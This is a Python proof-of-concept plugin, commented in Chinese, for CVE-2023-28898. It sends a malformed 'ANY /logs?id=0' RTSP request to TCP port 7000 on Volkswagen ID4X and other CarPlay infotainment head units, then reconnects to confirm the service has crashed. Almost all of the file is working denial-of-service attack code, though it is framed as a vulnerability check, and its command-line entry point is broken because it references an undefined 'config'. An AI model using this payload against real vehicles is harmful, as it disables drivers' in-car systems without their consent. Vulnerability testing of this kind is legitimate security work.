"""
PoC Name: RTSP CarPlay DoS (CVE-2023-28898)
CVE: CVE-2023-28898
Component: Application Stack
Category: Application
Severity: High
CVSS: 7.5
Description: 大众 ID4X 等车型 CarPlay RTSP 服务对畸形 ANY /logs?id=0 请求处理不当，导致 IVI 头单元拒绝服务
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python3 59_RTSP_CarPlay_DoS.py <args>
"""
import socket
import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin


class RTSPCarPlayDoSPlugin(IVIVulnerabilityPlugin):
    """
    CVE-2023-28898 - RTSP/CarPlay 头单元拒绝服务漏洞 PoC
    
    漏洞描述:
    大众 ID4X 及多款搭载 CarPlay 的车辆 IVI 系统，在 TCP:7000 端口暴露 RTSP 服务。
    该服务对 "ANY /logs?id=0 RTSP/1.0" 形式的畸形请求处理不当，可导致
    信息娱乐单元（IVI）服务崩溃，实现拒绝服务（DoS）。
    
    检测逻辑:
    向 TCP:7000 发送畸形 RTSP 请求，通过判断服务响应异常（连接重置/无响应）
    来确认漏洞是否存在。仅发送一个探测包，安全性良好。
    """

    RTSP_PORT = 7000
    # 触发 DoS 的畸形 RTSP 请求
    MALFORMED_REQUEST = (
        "ANY /logs?id=0 RTSP/1.0\r\n"
        "Host: {host}:{port}\r\n"
        "\r\n"
    )

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.results["cve_id"] = "CVE-2023-28898"
        self.results["description"] = (
            "RTSP/CarPlay IVI 头单元拒绝服务漏洞 - 畸形 ANY 请求触发 "
            "TCP:7000 RTSP 服务崩溃"
        )
        self.port = int(self.params.get("target_port", self.RTSP_PORT))

    def check_prerequisites(self):
        if not self.target_ip:
            self.logger.error("需要指定目标 IP 地址（参数: ip 或 target_ip）")
            return False
        return True

    def exploit(self):
        host = self.target_ip
        port = self.port

        # Step 1: 确认 RTSP 端口是否开放
        self.logger.info(f"[1/3] 正在探测 {host}:{port} 是否开放...")
        try:
            probe_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            probe_sock.settimeout(self.timeout)
            result = probe_sock.connect_ex((host, port))
            probe_sock.close()
            if result != 0:
                self.logger.info(f"[-] 端口 {port} 未开放，目标不含 CarPlay RTSP 服务。")
                self.results["evidence"] = f"TCP:{port} 未开放"
                return
            self.logger.info(f"[+] TCP:{port} 开放，疑似 CarPlay/RTSP 服务。")
        except Exception as e:
            self.logger.error(f"端口探测异常: {e}")
            self.results["evidence"] = f"探测异常: {e}"
            return

        # Step 2: 发送正常 OPTIONS 请求，获取基准响应
        self.logger.info("[2/3] 发送标准 RTSP OPTIONS 请求获取基准响应...")
        normal_banner = self._send_rtsp(
            host, port, f"OPTIONS * RTSP/1.0\r\nHost: {host}:{port}\r\nCSeq: 1\r\n\r\n"
        )
        if normal_banner is None:
            self.logger.info("[-] 无法建立基准连接，该端口可能不是 RTSP 服务。")
            self.results["evidence"] = "基准 OPTIONS 请求失败，端口可能非 RTSP"
            return
        self.logger.info(f"[*] 基准响应: {repr(normal_banner[:80])}")

        # Step 3: 发送畸形 ANY 请求，检测响应异常
        self.logger.info("[3/3] 发送畸形 ANY /logs?id=0 RTSP 请求（CVE-2023-28898）...")
        malformed = self.MALFORMED_REQUEST.format(host=host, port=port)
        abnormal_resp = self._send_rtsp(host, port, malformed, timeout=6)

        if abnormal_resp is None:
            # 服务没有响应或连接被重置 → 可能已触发崩溃
            self.logger.warning("[!] 发送畸形请求后服务无响应或连接被重置，疑似触发 DoS！")

            # 二次确认: 尝试重新连接
            time.sleep(1.5)
            self.logger.info("[*] 正在二次确认服务是否已崩溃...")
            recheck = self._send_rtsp(
                host, port, f"OPTIONS * RTSP/1.0\r\nHost: {host}:{port}\r\nCSeq: 2\r\n\r\n",
                timeout=3
            )
            if recheck is None:
                self.results["vulnerable"] = True
                self.results["evidence"] = (
                    f"CVE-2023-28898: 向 {host}:{port} 发送 'ANY /logs?id=0 RTSP/1.0' "
                    f"后服务无响应且重连失败，判定为 DoS 漏洞存在。"
                    f"基准响应: {repr(normal_banner[:60])}"
                )
                print(f"[!] 【漏洞存在】CVE-2023-28898 RTSP DoS 确认 - {host}:{port}")
            else:
                self.logger.info("[-] 服务已恢复，可能仅为暂时中断，标记为疑似。")
                self.results["vulnerable"] = False
                self.results["evidence"] = (
                    f"发送畸形请求后无响应，但服务已恢复。响应: {repr(recheck[:60])}"
                )
        else:
            # 收到了响应，检查是否为错误码
            self.logger.info(f"[*] 畸形请求响应: {repr(abnormal_resp[:120])}")
            if b"500" in abnormal_resp or b"400" in abnormal_resp:
                self.results["vulnerable"] = True
                self.results["evidence"] = (
                    f"CVE-2023-28898: 畸形 ANY 请求返回服务端错误 "
                    f"({repr(abnormal_resp[:80])})"
                )
                print(f"[!] 【漏洞存在】CVE-2023-28898 - 服务返回异常错误码")
            else:
                self.logger.info("[-] 服务正常处理了畸形请求，未检测到漏洞。")
                self.results["vulnerable"] = False
                self.results["evidence"] = f"正常响应: {repr(abnormal_resp[:80])}"

    def _send_rtsp(self, host, port, request, timeout=None):
        """发送 RTSP 请求并返回响应，失败返回 None"""
        if timeout is None:
            timeout = self.timeout
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(request.encode("utf-8"))
            response = sock.recv(4096)
            sock.close()
            return response
        except (socket.timeout, ConnectionResetError, BrokenPipeError):
            return None
        except Exception as e:
            self.logger.debug(f"_send_rtsp 异常: {e}")
            return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 59_RTSP_CarPlay_DoS.py <args>")
        sys.exit(1)
    plugin = RTSPCarPlayDoSPlugin(config)
    plugin.run_verify()
